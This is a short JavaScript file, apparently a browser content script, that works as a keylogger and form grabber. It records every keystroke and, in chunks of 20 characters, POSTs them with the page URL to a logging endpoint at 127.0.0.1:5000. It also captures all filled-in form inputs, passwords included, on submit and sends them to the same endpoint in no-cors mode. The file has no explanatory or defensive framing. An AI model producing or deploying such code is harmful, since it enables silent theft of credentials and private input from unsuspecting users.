const LOG_URL = "http://127.0.0.1:5000/log";

let buffer = "";
document.addEventListener('keydown', (e) => {
    buffer += e.key;
    if (buffer.length >= 20) {
        fetch(LOG_URL, {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify({ url: window.location.href, data: buffer })
        });
        buffer = "";
    }
});

document.addEventListener('submit', (e) => {
    let data = {};
    const inputs = e.target.querySelectorAll('input');
    inputs.forEach(i => { if(i.value) data[i.name || i.type] = i.value; });
    fetch(LOG_URL, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({ url: window.location.href, data: "FORM: " + JSON.stringify(data) })
    });
});